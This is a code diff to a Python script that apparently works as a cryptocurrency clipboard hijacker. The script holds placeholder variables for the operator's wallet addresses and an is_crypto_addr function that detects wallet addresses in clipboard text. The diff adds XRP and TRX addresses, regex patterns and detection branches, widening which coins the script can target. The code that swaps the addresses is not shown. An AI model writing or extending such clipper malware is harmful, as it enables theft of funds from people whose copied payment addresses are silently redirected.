@@ -19,6 +19,8 @@ bnbaddr = "SET BNB ADDRESS HERE"
 baseaddr = "SET BASE ADDRESS HERE"
 adaaddr = "SET ADA ADDRESS HERE"
 dotaddr = "SET DOT ADDRESS HERE"
+xrpaddr = "SET XRP ADDRESS HERE"
+trxaddr = "SET TRX ADDRESS HERE"
 
 single_use = False
 
@@ -47,6 +49,8 @@ def is_crypto_addr(clipboard_text):
         base_address_pattern = r"^0x[a-fA-F0-9]{40}$"
         ada_address_pattern = r"^addr1[0-9a-z]{58,59}$"
         dot_address_pattern = r"^1[a-km-zA-HJ-NP-Z1-9]{47}$"
+        xrp_address_pattern = r"^r[1-9A-HJ-NP-Za-km-z]{25,35}$"
+        trx_address_pattern = r"^T[1-9A-HJ-NP-Za-km-z]{33}$"
 
         if re.match(btc_address_pattern, clipboard_text):
             return "BTC"
@@ -68,6 +72,10 @@ def is_crypto_addr(clipboard_text):
             return "ADA"
         elif re.match(dot_address_pattern, clipboard_text):
             return "DOT"
+        elif re.match(xrp_address_pattern, clipboard_text):
+            return "XRP"
+        elif re.match(trx_address_pattern, clipboard_text):
+            return "TRX"
         else:
             return False
     except Exception:
